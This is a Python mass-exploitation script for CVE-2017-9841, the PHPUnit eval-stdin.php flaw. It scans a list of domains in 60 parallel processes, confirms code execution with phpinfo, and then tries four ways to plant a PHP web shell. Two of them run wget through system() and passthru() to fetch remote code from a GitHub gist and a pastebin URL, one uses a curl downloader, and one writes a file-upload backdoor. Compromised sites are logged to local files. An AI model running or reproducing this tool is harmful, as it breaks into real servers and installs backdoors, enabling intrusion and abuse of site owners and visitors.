import requests,urllib3,random,base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool


def logo():
	print(
	""" 
	 [x] EXPLOIT LARAVAL : CVE-2017-9841 
         [x] Telegram : @Deadcode1975
         [x] Canal : @Team1975
	 
	"""
	)

# ~ check shells if uploaded
def check_upload(domain,path,random_name):
	path_upload=path.replace("eval-stdin.php",random_name)
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "en-us,en;q=0.5",
	"Accept-Encoding": "gzip,deflate",
	"Content-Type": "application/x-www-form-urlencoded",
	"Connection": "close",
	"Referer": str(domain),
	"Origin": str(domain)}
	# ~ try:
	if "l7WA" in requests.get(f'{domain}{path_upload}?shell=1975TEAM', headers=headers,verify=False,timeout=8).text:
		open("shells.txt","a").write(f"{domain}{path_upload}\n")
		print(f"[x] Uploaded ~ {domain}")
		return True
	else:
		print(f"[x] Non uploaded ~ {domain}")
		return False
	# ~ except:pass
		
# ~ upload it with POST and GET and Head and PUT methods
def upload_it_curl(domain,path,random_name):
	print("  [x] Method 1")
	code_upload = '<?php function adminer($url, $isi) {$fp = fopen($isi, "w");$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_FILE, $fp);return curl_exec($ch);curl_close($ch);fclose($fp);ob_flush();flush();}if(adminer("https://gist.githubusercontent.com/tarikalqlawi/d7f5ed835389af326f369da4c351bf51/raw/07b0ceecbb3ad60326213a97c6ec05d9a280e176/ghirdahkinhh.php","'+random_name+'")) {echo "safiraknadi";} else {echo "Nonrakmanadich";}?>'
	base64_code_upload = base64.b64encode(code_upload.encode('ascii')).decode("utf-8") 
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Referer": str(domain),
	"Origin": str(domain)}
	payload1 = f'<?php eval("?>".base64_decode("{base64_code_upload}")); ?>'
	try:
		if "safiraknadi" in requests.get(f'{domain}{path}', headers=headers, data=payload1,verify=False,timeout=8).text:
			# ~ print(requests.get(f'{domain}{path}', headers=headers, data=payload1,verify=False,timeout=8).text)
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.post(f'{domain}{path}', headers=headers, data=payload1,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.head(f'{domain}{path}', headers=headers, data=payload1,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.put(f'{domain}{path}', headers=headers, data=payload1,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass

# ~ upload it with POST and GET and Head and PUT methods
def upload_it_passthru(domain,path,random_name):
	print("  [x] Method 2")
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Referer": str(domain),
	"Origin": str(domain)}
	payload2 = f'<?php echo passthru("wget https://pastebin.com/raw/5gz4TZRb -O {random_name}"); echo "safiraknadi";?>'
	try:
		if "safiraknadi" in requests.get(f'{domain}{path}', headers=headers, data=payload2,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.post(f'{domain}{path}', headers=headers, data=payload2,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.head(f'{domain}{path}', headers=headers, data=payload2,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.put(f'{domain}{path}', headers=headers, data=payload2,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
# ~ upload it with POST and GET and Head and PUT methods
def upload_it_system(domain,path,random_name):	
	print("  [x] Method 3")
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Referer": str(domain),
	"Origin": str(domain)}
	payload3 = f'<?php system("wget https://gist.githubusercontent.com/tarikalqlawi/d7f5ed835389af326f369da4c351bf51/raw/07b0ceecbb3ad60326213a97c6ec05d9a280e176/ghirdahkinhh.php -O {random_name}"); echo "safiraknadi";?>'
	try:
		if "safiraknadi" in requests.get(f'{domain}{path}', headers=headers, data=payload3,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.post(f'{domain}{path}', headers=headers, data=payload3,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.head(f'{domain}{path}', headers=headers, data=payload3,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.put(f'{domain}{path}', headers=headers, data=payload3,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
# ~ upload it with POST and GET and Head and PUT methods
def upload_it_open(domain,path,random_name):
	shella_1 = """<?php
	if ($_GET["shell"] == "1975TEAM"){echo "l7WA";}
	echo "1975TEAM";
	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
	if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>nadi!!!<b><br><br>'; }
	else { echo '<b>nadi no!!!</b><br><br>'; }
	}
	?>"""
	print("  [x] Method 4")
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Referer": str(domain),
	"Origin": str(domain)}
	payload4 = f'<?php $data= "{shella_1}"; $j=fopen("{random_name}","a"); fwrite($j,$data);?>'
	try:
		if "safiraknadi" in requests.get(f'{domain}{path}', headers=headers, data=payload4,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.post(f'{domain}{path}', headers=headers, data=payload4,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.head(f'{domain}{path}', headers=headers, data=payload4,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass
	try:
		if "safiraknadi" in requests.put(f'{domain}{path}', headers=headers, data=payload4,verify=False,timeout=8).text:
			return True
		else:pass
	except:pass

	
# ~ check if its Vul with POST and GET and Head and PUT methods
def check_if(domain,path,random_name):
	path=path.strip()
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Referer": str(domain),
	"Origin": str(domain)}
	
	payload = f'<?php phpinfo(); ?>'
	try:
		if "phpinfo" in requests.get(f'{domain}{path}', headers=headers, data=payload,verify=False,timeout=10).text:
			return True
		else:pass
	except:pass

	try:
		if "phpinfo" in requests.post(f'{domain}{path}', headers=headers, data=payload,verify=False,timeout=10).text:
			return True
		else:pass
	except:pass
	
	try:
		if "phpinfo" in requests.head(f'{domain}{path}', headers=headers, data=payload,verify=False,timeout=10).text:
			return True
		else:pass
	except:pass
	
	try:
		if "phpinfo" in requests.put(f'{domain}{path}', headers=headers, data=payload,verify=False,timeout=10).text:
			return True
		else:pass
	except:pass
	
def check(domain):
	domain=domain.strip()
	if domain.endswith("/") or domain.endswith("//"):
		domain = domain[:-1]
	else:pass
	if "http" not in domain:
		domain= f"http://{domain}/"
	else:pass
	# ~ try:
	# ~ path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
	Agent = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Referer": str(domain),
	"Origin": str(domain)}
	for path in open("./lists_/paths.txt").read().splitlines():
		random_name=f"{str(random.randint(123456,654321))}-1975TEAM.php"
		if check_if(domain,path,random_name):
			print(f"[x] infected {domain}")
			open("infcted_website.txt","a").write(f"{domain}{path}\n")
			
			# ~ upload and check with system function
			upload_it_system(domain,path,random_name)
			if check_upload(domain,path,random_name):break
			else:pass
			
			# ~ upload and check with passthru function
			upload_it_passthru(domain,path,random_name)
			if check_upload(domain,path,random_name):break
			else:pass

			# ~ upload and check with curl function
			upload_it_curl(domain,path,random_name)
			if check_upload(domain,path,random_name):break
			else:pass

			# ~ upload and check with fopen function
			upload_it_open(domain,path,random_name)
			if check_upload(domain,path,random_name):break
			else:pass
		else:
			print(f"[x] No {domain}")



def main():
	logo();
	domain = open(input("[-] Listname: ")).readlines()
	print("[X] - 1975 Team - [x]")
	ThreadPool = Pool(60)
	ThreadPool.map(check, domain)
	
if __name__ == "__main__":
	main();
	# ~ check("http://curvemotors.livepurchase.io/")
